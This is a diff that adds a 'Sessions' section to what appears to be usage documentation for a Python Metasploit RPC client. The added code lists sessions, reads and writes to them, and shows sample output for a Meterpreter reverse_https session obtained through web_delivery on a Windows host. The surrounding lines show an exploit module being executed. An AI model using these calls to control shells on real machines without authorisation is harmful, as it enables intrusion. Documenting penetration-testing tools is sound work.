@@ -128,6 +128,39 @@ exploit.execute(payload='cmd/unix/interact')
 # Execute the module and return the output
 cid = client.consoles.console().cid
 client.consoles.console(cid).execute_module_with_output(exploit, payload='cmd/unix/interact')
-# >>> '... [-] 127.0.0.1:21 - Exploit failed [unreachable]: Rex::ConnectionRefused
+# >>> '... [-] 127.0.0.1:21 - Exploit failed [unreachable]: Rex::ConnectionRefused \
 # 	   The connection was refused by the remote host (127.0.0.1:21).\n[*] Exploit completed, but no session was created.\n'
+
+
+## Sessions
+
+# Get all sessions
+client.sessions.list
+# >>> {'1': {'type': 'meterpreter',
+#   'tunnel_local': '192.168.1.2:4444',
+#   'tunnel_peer': '192.168.1.3:52688',
+#   'via_exploit': 'exploit/multi/script/web_delivery',
+#   'via_payload': 'payload/windows/x64/meterpreter/reverse_https',
+#   'desc': 'Meterpreter',
+#   'info': 'DESKTOP-UYTD0H\\person1 @ DESKTOP-UYTD0H',
+#   'workspace': 'default',
+#   'session_host': '192.168.1.2',
+#   'session_port': 52688,
+#   'target_host': '',
+#   'username': 'person1',
+#   'uuid': 'eaaaeufs',
+#   'exploit_uuid': '55dgrk6z',
+#   'routes': '',
+#   'arch': 'x64',
+#   'platform': 'windows'}}
+
+# Get a session's info
+client.sessions.session('1').info
+
+# Write to a session
+client.sessions.session('1').write('help\n')
+
+# Read a session
+client.sessions.session('1').read()
+# >>> '\nCore Commands\n=============\n\n    Command                   Description\n    ------- [...]'
 
